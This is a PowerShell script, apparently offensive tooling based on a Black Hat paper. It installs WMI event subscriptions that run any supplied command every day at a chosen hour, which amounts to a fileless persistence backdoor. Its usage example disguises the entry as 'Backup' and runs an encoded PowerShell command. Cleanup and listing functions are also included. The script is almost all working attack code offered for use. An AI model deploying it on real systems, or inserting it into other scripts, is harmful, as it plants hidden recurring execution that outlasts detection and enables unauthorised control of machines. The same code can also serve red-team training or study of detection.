<#
.Synopsis
    Invoke-WMIEvent
    https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-
Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-
Backdoor-wp.pdf

.DESCRIPTION
	PS C:\> Usage: Invoke-WMIEvent -Name <Name> -Command <Command> -Hour <Hour> -Minute <Minute>
.EXAMPLE
    PS C:\> Get-WMIEvent
.EXAMPLE
    PS C:\> Invoke-WMIEvent -Name Backup -Command "powershell -enc abc" -Hour 10 -Minute 30
.EXAMPLE
    PS C:\> Remove-WMIEvent -Name Backup
#>
Function Invoke-WMIEvent 
{

    Param
    (
        [Parameter(Mandatory=$true)][string]
        $Name,
        [Parameter(Mandatory=$true)][string]
        $Command,
        [string]
        $Hour=9,
        [string]
        $Minute=30
    )

    $Filter=Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{name="$Name";EventNameSpace='root\CimV2';QueryLanguage="WQL";Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = $Hour AND TargetInstance.Minute = $Minute GROUP WITHIN 60"}; 

    $Consumer=Set-WmiInstance -Namespace "root\subscription" -Class 'CommandLineEventConsumer' -Arguments @{ name="$Name";CommandLineTemplate="$Command";RunInteractively='false'}; 

    Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding -Arguments @{Filter=$Filter;Consumer=$Consumer} 

    Write-Output ""
    Write-Output "[+] WMIEvent added: $Name for $Hour : $Minute"
    Write-Output "[+] Command: $Command"
    Write-Output ""
}

Function Remove-WMIEvent 
{

    Param
    (
        [Parameter(Mandatory=$true)][string]
        $Name
    )

    Write-Output ""
    Write-Output "[*] Removing CommandLineEventConsumer"
    Get-WmiObject CommandLineEventConsumer -Namespace root\subscription -Filter "name='$Name'" | Remove-WmiObject
    Write-Output "[*] Removing __EventFilter"
    Get-WmiObject __EventFilter -Namespace "root\subscription" -Filter "name='$Name'" | Remove-WmiObject
    Write-Output "[*] Removing __FilterToConsumerBinding"
    Get-WmiObject  __FilterToConsumerBinding -Namespace "root\subscription" | where-object -Property Consumer -like "*$NAME*" | Remove-WmiObject
    Write-Output ""
    Write-Output "[+] WMIEvent removed: $Name"
    Write-Output ""
}
Function Get-WMIEvent
{
	gwmi CommandLineEventConsumer -Namespace root\subscription
}
